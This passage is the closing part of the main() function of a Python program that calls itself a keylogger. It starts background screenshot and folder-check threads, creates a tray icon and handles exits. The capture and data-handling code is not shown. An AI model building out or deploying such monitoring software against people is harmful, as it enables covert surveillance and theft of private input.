        screenshot_thread = threading.Thread(target=take_screenshot, daemon=True)
        screenshot_thread.start()
        
        # Start folder check thread
        folder_check_thread = threading.Thread(target=schedule_folder_check, daemon=True)
        folder_check_thread.start()

        # Start tray icon
        create_tray_icon()
        
    except KeyboardInterrupt:
        show_notification(APP_NAME, "Keylogger is closing...")
        logging.info("Application interrupted by user.")
        print("Application interrupted by user.")
        sys.exit(0)
    except Exception as e:
        logging.error(f"Main Error: {e}")
        print(f"Main Error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
